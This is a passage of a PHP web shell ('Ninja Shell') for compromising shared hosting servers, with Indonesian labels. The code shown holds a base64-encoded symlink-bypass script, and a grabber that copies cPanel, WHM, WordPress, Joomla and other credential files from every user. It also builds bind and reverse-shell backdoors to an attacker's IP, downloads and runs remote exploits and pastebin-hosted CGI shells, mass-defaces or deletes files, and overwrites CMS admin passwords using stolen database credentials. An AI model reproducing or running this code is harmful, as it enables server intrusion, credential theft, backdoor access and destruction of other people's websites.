								if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
									continue;
								echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
								echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
								$dcount++;
							}
							fclose($file);
							echo "</table></center>";
							unlink("test.txt");
						} else
							echo "<center><font size=3>Cannot create Symlink</font></center>";
					}
				}
			} elseif (isset($_POST['symlink_py'])) {
				$sym_dir = mkdir('ia_sympy', 0755);
				chdir('ia_sympy');
				$file_sym = "sym.py";
				$sym_script = "Iy8qUHl0aG9uDQoNCmltcG9ydCB0aW1lDQppbXBvcnQgb3MNCmltcG9ydCBzeXMNCmltcG9ydCByZQ0KDQpvcy5zeXN0ZW0oImNvbG9yIEMiKQ0KDQpodGEgPSAiXG5GaWxlIDogLmh0YWNjZXNzIC8vIENyZWF0ZWQgU3VjY2Vzc2Z1bGx5IVxuIg0KZiA9ICJBbGwgUHJvY2Vzc2VzIERvbmUhXG5TeW1saW5rIEJ5cGFzc2VkIFN1Y2Nlc3NmdWxseSFcbiINCnByaW50ICJcbiINCnByaW50ICJ+Iio2MA0KcHJpbnQgIlN5bWxpbmsgQnlwYXNzIDIwMTQgYnkgTWluZGxlc3MgSW5qZWN0b3IgIg0KcHJpbnQgIiAgICAgICAgICAgICAgU3BlY2lhbCBHcmVldHogdG8gOiBQYWsgQ3liZXIgU2t1bGx6Ig0KcHJpbnQgIn4iKjYwDQoNCm9zLm1ha2VkaXJzKCdicnVkdWxzeW1weScpDQpvcy5jaGRpcignYnJ1ZHVsc3ltcHknKQ0KDQpzdXNyPVtdDQpzaXRleD1bXQ0Kb3Muc3lzdGVtKCJsbiAtcyAvIGJydWR1bC50eHQiKQ0KDQpoID0gIk9wdGlvbnMgSW5kZXhlcyBGb2xsb3dTeW1MaW5rc1xuRGlyZWN0b3J5SW5kZXggYnJ1ZHVsLnBodG1sXG5BZGRUeXBlIHR4dCAucGhwXG5BZGRIYW5kbGVyIHR4dCAucGhwIg0KbSA9IG9wZW4oIi5odGFjY2VzcyIsIncrIikNCm0ud3JpdGUoaCkNCm0uY2xvc2UoKQ0KcHJpbnQgaHRhDQoNCnNmID0gIjxodG1sPjx0aXRsZT5TeW1saW5rIFB5dGhvbjwvdGl0bGU+PGNlbnRlcj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTU+U3ltbGluayBCeXBhc3MgMjAxNzxicj48Zm9udCBzaXplPTQ+TWFkZSBCeSBNaW5kbGVzcyBJbmplY3RvciA8YnI+UmVjb2RlZCBCeSBDb243ZXh0PC9mb250PjwvZm9udD48YnI+PGZvbnQgY29sb3I9d2hpdGUgc2l6ZT0zPjx0YWJsZT4iDQoNCm8gPSBvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3InKQ0Kbz1vLnJlYWQoKQ0KbyA9IHJlLmZpbmRhbGwoJy9ob21lL1x3KycsbykNCg0KZm9yIHh1c3IgaW4gbzoNCgl4dXNyPXh1c3IucmVwbGFjZSgnL2hvbWUvJywnJykNCglzdXNyLmFwcGVuZCh4dXNyKQ0KcHJpbnQgIi0iKjMwDQp4c2l0ZSA9IG9zLmxpc3RkaXIoIi92YXIvbmFtZWQiKQ0KDQpmb3IgeHhzaXRlIGluIHhzaXRlOg0KCXh4c2l0ZT14eHNpdGUucmVwbGFjZSgiLmRiIiwiIikNCglzaXRleC5hcHBlbmQoeHhzaXRlKQ0KcHJpbnQgZg0KcGF0aD1vcy5nZXRjd2QoKQ0KaWYgIi9wdWJsaWNfaHRtbC8iIGluIHBhdGg6DQoJcGF0aD0iL3B1YmxpY19odG1sLyINCmVsc2U6DQoJcGF0aCA9ICIvaHRtbC8iDQpjb3VudGVyPTENCmlwcz1vcGVuKCJicnVkdWwucGh0bWwiLCJ3IikNCmlwcy53cml0ZShzZikNCg0KZm9yIGZ1c3IgaW4gc3VzcjoNCglmb3IgZnNpdGUgaW4gc2l0ZXg6DQoJCWZ1PWZ1c3JbMDo1XQ0KCQlzPWZzaXRlWzA6NV0NCgkJaWYgZnU9PXM6DQoJCQlpcHMud3JpdGUoIjxib2R5IGJnY29sb3I9YmxhY2s+PHRyPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7Y29sb3I6d2hpdGU7PiVzPC90ZD48dGQgc3R5bGU9Zm9udC1mYW1pbHk6Y2FsaWJyaTtmb250LXdlaWdodDpib2xkO2NvbG9yOnJlZDs+JXM8L3RkPjx0ZCBzdHlsZT1mb250LWZhbWlseTpjYWxpYnJpO2ZvbnQtd2VpZ2h0OmJvbGQ7PjxhIGhyZWY9YnJ1ZHVsLnR4dC9ob21lLyVzJXMgdGFyZ2V0PV9ibGFuayA+JXM8L2E+PC90ZD4iJShjb3VudGVyLGZ1c3IsZnVzcixwYXRoLGZzaXRlKSkNCgkJCWNvdW50ZXI9Y291bnRlcisx";
				$sym = fopen($file_sym, "w");
				fwrite($sym, base64_decode($sym_script));
				chmod($file_sym, 0755);
				$jancok = exe("python sym.py");
				echo "<br><center>Done ... <a href='ia_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
			}
		} elseif (isset($_GET[hex('config')])) {
			$dir = path();
			if ($_POST) {
				$passwd = $_POST['passwd'];
				mkdir("Exc_config", 0777);
				$isi_htc = "Options all\nRequire None\nSatisfy Any";
				$htc = fopen("Exc_config/.htaccess", "w");
				fwrite($htc, $isi_htc);
				preg_match_all('/(.*?):x:/', $passwd, $user_config);
				foreach ($user_config[1] as $user_Exc) {
					$user_config_dir = "/home/$user_Exc/public_html/";
					if (is_readable($user_config_dir)) {
						$grab_config = array(
							"/home/$user_Exc/.my.cnf" => "cpanel",
							"/home/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home1/$user_Exc/.my.cnf" => "cpanel",
							"/home1/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home1/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home1/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home1/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home1/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home1/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home1/$user_Exc/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home1/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home1/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home1/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home1/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home1/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home1/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home1/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home2/$user_Exc/.my.cnf" => "cpanel",
							"/home2/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home2/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home2/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home2/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home2/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home2/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home2/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home2/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home2/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home2/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home2/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home2/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home2/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home2/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home2/$user_Exc/public_html/application/config/database.php" => "Ellislab",
							"/home3/$user_Exc/.my.cnf" => "cpanel",
							"/home3/$user_Exc/.accesshash" => "WHM-accesshash",
							"/home3/$user_Exc/public_html/bw-configs/config.ini" => "BosWeb",
							"/home3/$user_Exc/public_html/config/koneksi.php" => "Lokomedia",
							"/home3/$user_Exc/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
							"/home3/$user_Exc/public_html/clientarea/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/whm/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/whmcs/configuration.php" => "WHMCS",
							"/home3/$user_Exc/public_html/forum/config.php" => "phpBB",
							"/home3/$user_Exc/public_html/sites/default/settings.php" => "Drupal",
							"/home3/$user_Exc/public_html/config/settings.inc.php" => "PrestaShop",
							"/home3/$user_Exc/public_html/app/etc/local.xml" => "Magento",
							"/home3/$user_Exc/public_html/joomla/configuration.php" => "Joomla",
							"/home3/$user_Exc/public_html/configuration.php" => "Joomla",
							"/home3/$user_Exc/public_html/wp/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/wordpress/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/wp-config.php" => "WordPress",
							"/home3/$user_Exc/public_html/admin/config.php" => "OpenCart",
							"/home3/$user_Exc/public_html/slconfig.php" => "Sitelok",
							"/home3/$user_Exc/public_html/application/config/database.php" => "Ellislab"
						);
						foreach ($grab_config as $config => $nama_config) {
							$ambil_config = file_get_contents($config);
							if ($ambil_config == '') {
							} else {
								$file_config = fopen("Exc_config/$user_Exc-$nama_config.txt", "w");
								fputs($file_config, $ambil_config);
							}
						}
					}
				}
				echo "<center><a class = 'ajx' href='?dir=$dir/Exc_config'><font color=lime>Done</font></a></center>";
			} else {
				$baru = hex($dir);
				$baru2 = hex('bypass-passwd');
				echo "<hr><br><center>";
				echo "<h2>Config Grabber Ninja Shell</h2>";
				echo "<form method=\"post\" action=\"\"><center>etc/passwd ( Error ? <a class = 'ajx' href='?d=$baru&$baru2'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area form-control' rows='15' cols='60'>\n";
				echo file_get_contents('/etc/passwd');
				echo "</textarea><br><input type=\"submit\" value=\"Grab\" class = 'form-control' style='width:250px;'></td></tr></center>\n";
				echo "<br><hr>";
			}
		} elseif (isset($_GET[hex('network')])) {

			$dir = path();
			// bind connect with c
			if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdc.c", $port_bind_bd_c);
				exe("gcc -o bdc bdc.c");
				exe("chmod 777 bdc");
				@unlink("bdc.c");
				exe("./bdc " . $port . " " . $passwrd . " &");
				$scan = exe("ps aux");
				if (eregi("./bdc $por", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg =  "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// bind connect with perl
			elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
				$port = trim($_POST['port']);
				$passwrd = trim($_POST['bind_pass']);
				tulis("bdp", $port_bind_bd_pl);
				exe("chmod 777 bdp");
				$p2 = which("perl");
				exe($p2 . " bdp " . $port . " &");
				$scan = exe("ps aux");
				if (eregi("$p2 bdp $port", $scan)) {
					$msg = "<p>Process found running, backdoor setup successfully.</p>";
				} else {
					$msg = "<p>Process not found running, backdoor not setup successfully.</p>";
				}
			}
			// back connect with c
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcc.c", $back_connect_c);
				exe("gcc -o bcc bcc.c");
				exe("chmod 777 bcc");
				@unlink("bcc.c");
				exe("./bcc " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			}
			// back connect with perl
			elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
				$ip = trim($_POST['ip']);
				$port = trim($_POST['backport']);
				tulis("bcp", $back_connect);
				exe("chmod +x bcp");
				$p2 = which("perl");
				exe($p2 . " bcp " . $ip . " " . $port . " &");
				$msg = "Now script try connect to " . $ip . " port " . $port . " ...";
			} elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
				$pilihan = trim($_POST['pilihan']);
				$wurl = trim($_POST['wurl']);
				$namafile = download($pilihan, $wurl);
				if (is_file($namafile)) {

					$msg = exe($wcmd);
				} else $msg = "error: file not found $namafile";
			}

		?>
			<hr><br>
			<center>
				<h2>Netsploit Ninja Shell</h2>
				<table class="tabnet">
					<tr>
						<th>Port Binding</th>
						<th>Connect Back</th>
						<th>Load and Exploit</th>
					</tr>
					<tr>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>Port <br><br><br>Pass<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="port" size="26" value="<?php echo $bindport ?>"><br><br><input class="form-control" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"><br><select class="form-control" size="1" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input class="form-control" type="submit" name="bind" value="Bind" style="width:80px"></td>
									</tr>
								</form>
							</table>
						</td>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>IP<br><br><br>Port<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>"><br><br><input class="form-control" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"><br><select size="1" class="form-control" name="use">
												<option value="Perl">Perl</option>
												<option value="C">C</option>
											</select><br><input type="submit" name="backconn" value="Connect" class="form-control" style="width:100px"></td>
									</tr>

								</form>
							</table>
						</td>
						<td>
							<table>
								<form method="post">
									<tr>
										<td>url<br><br><br>cmd<br><br><br><br><br></td>
										<td><input class="form-control" type="text" name="wurl" style="width:220px;" value="www.some-code/exploits.c"><br><br><input class="form-control" type="text" name="wcmd" style="width:220px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"><br><select size="1" class="form-control" name="pilihan">
												<option value="wwget">wget</option>
												<option value="wlynx">lynx</option>
												<option value="wfread">fread</option>
												<option value="wfetch">fetch</option>
												<option value="wlinks">links</option>
												<option value="wget">GET</option>
												<option value="wcurl">curl</option>
											</select><br><input type="submit" name="expcompile" class="form-control" value="Go" style="width:80px;"></td>
									</tr>
								</form>
							</table>
						</td>
					</tr>
				</table>
			</center>
			<hr><br>
			<div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
		<?php
		} elseif (isset($_GET[hex('cgi')])) {

			echo "<hr><br>";
			echo "<center>
						<h2> CGI Ninja Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi' class = 'form-control' value = 'CGI Perl' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgi2' class = 'form-control' value = 'CGI Perl 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'cgipy' class = 'form-control' value = 'CGI Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";



			if (isset($_POST['cgi'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgi.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker \n AddHandler cgi-script .Index_Attacker";

				$htcgi = fopen(".htaccess", "w");

				$ch = curl_init("https://pastebin.com/raw/Lj46KxFT");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				fclose($cgi);
				ob_flush();
				flush();
				echo "<br><center>Done ... <a href='$server/ia_cgi/cgi.Index_Attacker' target='_blank'>Klik Here</a>";
			} elseif (isset($_POST['cgi2'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgi2.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker ";
				$htcgi = fopen(".htaccess", "w");
				$ch = curl_init("https://pastebin.com/raw/ZPZMC6K4");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				echo "<br><center>Done ... <a href='ia_cgi/cgi2.Index_Attacker' target='_blank'>Klik Here</a>";
			} elseif (isset($_POST['cgipy'])) {

				$cgi_dir = mkdir('ia_cgi', 0755);
				chdir('ia_cgi');
				$file_cgi = "cgipy.Index_Attacker";
				$memeg = ".htaccess";
				$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_Attacker \n AddHandler cgi-script .Index_Attacker \n AddHandler cgi-script .Index_Attacker";
				$htcgi = fopen(".htaccess", "w");
				$ch = curl_init("https://pastebin.com/raw/MYyXAXyY");
				$cgi = fopen($file_cgi, "w");
				curl_setopt($ch, CURLOPT_FILE, $cgi);
				curl_setopt($ch, CURLOPT_HEADER, 0);

				curl_exec($ch);
				curl_close($ch);
				fwrite($htcgi, $isi_htcgi);
				chmod($file_cgi, 0755);
				chmod($memeg, 0755);
				echo "<br><center>Done ... <a href='ia_cgi/cgipy.Index_Attacker' target='_blank'>Klik Here</a>";
			}
		} elseif (isset($_GET[hex('mass_tool')])) {
			$dir = path();
			echo "<center><form action=\"\" method=\"post\">\n";
			$dirr = $_POST['d_dir'];
			$index = $_POST["script"];
			$index = str_replace('"', "'", $index);
			$index = stripslashes($index);
			function edit_file($file, $index)
			{
				if (is_writable($file)) {
					clear_fill($file, $index);
					echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
				} else {
					echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
				}
			}
			function hapus_massal($dir, $namafile)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							if (file_exists("$dir/$namafile")) {
								unlink("$dir/$namafile");
							}
						} elseif ($dirb === '..') {
							if (file_exists("" . dirname($dir) . "/$namafile")) {
								unlink("" . dirname($dir) . "/$namafile");
							}
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									if (file_exists($lokasi)) {
										echo "DELETED $lokasi<br>";
										unlink($lokasi);
										$idx = hapus_massal($dirc, $namafile);
									}
								}
							}
						}
					}
				}
			}
			function clear_fill($file, $index)
			{
				if (file_exists($file)) {
					$handle = fopen($file, 'w');
					fwrite($handle, '');
					fwrite($handle, $index);
					fclose($handle);
				}
			}

			function gass()
			{
				global $dirr, $index;
				chdir($dirr);
				$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
				$files = scandir($dirr);
				$notallow = array(".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "..", ".");
				sort($files);
				$n = 0;
				foreach ($files as $file) {
					if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
						echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
						edit_file($file, $index);
						flush();
						$n = $n + 1;
					}
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
			}
			function ListFiles($dirrall)
			{

				if ($dh = opendir($dirrall)) {

					$files = array();
					$inner_files = array();
					$me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
					$notallow = array($me, ".htaccess", "error_log", "_vti_inf.html", "_private", "_vti_bin", "_vti_cnf", "_vti_log", "_vti_pvt", "_vti_txt", "cgi-bin", ".contactemail", ".cpanel", ".fantasticodata", ".htpasswds", ".lastlogin", "access-logs", "cpbackup-exclude-used-by-backup.conf", ".cgi_auth", ".disk_usage", ".statspwd", "Thumbs.db");
					while ($file = readdir($dh)) {
						if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
							if (is_dir($dirrall . "/" . $file)) {
								$inner_files = ListFiles($dirrall . "/" . $file);
								if (is_array($inner_files)) $files = array_merge($files, $inner_files);
							} else {
								array_push($files, $dirrall . "/" . $file);
							}
						}
					}

					closedir($dh);
					return $files;
				}
			}
			function gass_all()
			{
				global $index;
				$dirrall = $_POST['d_dir'];
				foreach (ListFiles($dirrall) as $key => $file) {
					$file = str_replace('//', "/", $file);
					echo "<center><strong>$file</strong> ===>";
					edit_file($file, $index);
					flush();
				}
				$key = $key + 1;
				echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>";
			}
			function sabun_massal($dir, $namafile, $isi_script)
			{
				if (is_writable($dir)) {
					$dira = scandir($dir);
					foreach ($dira as $dirb) {
						$dirc = "$dir/$dirb";
						$lokasi = $dirc . '/' . $namafile;
						if ($dirb === '.') {
							file_put_contents($lokasi, $isi_script);
						} elseif ($dirb === '..') {
							file_put_contents($lokasi, $isi_script);
						} else {
							if (is_dir($dirc)) {
								if (is_writable($dirc)) {
									echo "[<font color=lime>DONE</font>] $lokasi<br>";
									file_put_contents($lokasi, $isi_script);
									$idx = sabun_massal($dirc, $namafile, $isi_script);
								}
							}
						}
					}
				}
			}
			if ($_POST['mass'] == 'onedir') {
				echo "<br> Versi Text Area<br><textarea class = 'form-control' name='index' rows='10' cols='67'>\n";
				$ini = "http://";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo "$ini$row/$file\n";
					}
				}
				echo "</textarea><br><b>Versi Text</b><br><br><br>\n";
				$mainpath = $_POST[d_dir];
				$file = $_POST[d_file];
				$dir = opendir("$mainpath");
				$code = base64_encode($_POST[script]);
				$indx = base64_decode($code);
				while ($row = readdir($dir)) {
					$start = @fopen("$row/$file", "w+");
					$finish = @fwrite($start, $indx);
					if ($finish) {
						echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
					}
				}
				echo "<hr>";
			} elseif ($_POST['mass'] == 'sabunkabeh') {
				gass();
			} elseif ($_POST['mass'] == 'hapusmassal') {
				hapus_massal($_POST['d_dir'], $_POST['d_file']);
			} elseif ($_POST['mass'] == 'sabunmematikan') {
				gass_all();
			} elseif ($_POST['mass'] == 'massdeface') {
				echo "<div style='margin: 5px auto; padding: 5px'>";
				sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
				echo "</div>";
			} else {
				echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files Ninja Shell</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"form-control\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input class= 'form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input class= 'form-control' type='text' name='d_file' value='Exc.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>Hacked By ./Exorcism1337</textarea><br>
		<input class= 'form-control' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center><hr><br>";
			}
		} elseif (isset($_GET[hex('mass_user')])) {
			if ($_POST['hajar']) {
				if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
					print "username atau password harus lebih dari 6 karakter";
				} else {
					$user_baru = $_POST['user_baru'];
					$pass_baru = md5($_POST['pass_baru']);
					$conf = $_POST['config_dir'];

					if (preg_match("/^http:\/\//", $conf) or preg_match("/^https:\/\//", $conf)) {
						$get = curl($conf);
						preg_match_all('/<a href="(.*?).txt">/', $get, $link);
						foreach ($link[1] as $link_config) {
							$scan_conf[] = "$link_config.txt";
						}
					} else {
						$scan_conf = scandir($conf);
					}

					foreach ($scan_conf as $file_conf) {
						$config = file_get_contents("$conf/$file_conf");
						if (preg_match("/JConfig|joomla/", $config)) {
							$dbhost = getValue($config, "host = '", "'");
							$dbuser = getValue($config, "user = '", "'");
							$dbpass = getValue($config, "password = '", "'");
							$dbname = getValue($config, "db = '", "'");
							$dbprefix = getValue($config, "dbprefix = '", "'");
							$prefix = $dbprefix . "users";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result['id'];
							$site = getValue($config, "sitename = '", "'");
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Joomla<br>";
							if ($site == '') {
								print "Sitename => " . color(1, 1, "Can't get domain name") . "<br>";
							} else {
								print "Sitename => $site<br>";
							}
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/WordPress/", $config)) {
							$dbhost = getValue($config, "DB_HOST', '", "'");
							$dbuser = getValue($config, "DB_USER', '", "'");
							$dbpass = getValue($config, "DB_PASSWORD', '", "'");
							$dbname = getValue($config, "DB_NAME', '", "'");
							$dbprefix = getValue($config, "table_prefix  = '", "'");
							$prefix = $dbprefix . "users";
							$option = $dbprefix . "options";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[ID];
							$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[option_value];
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
							}
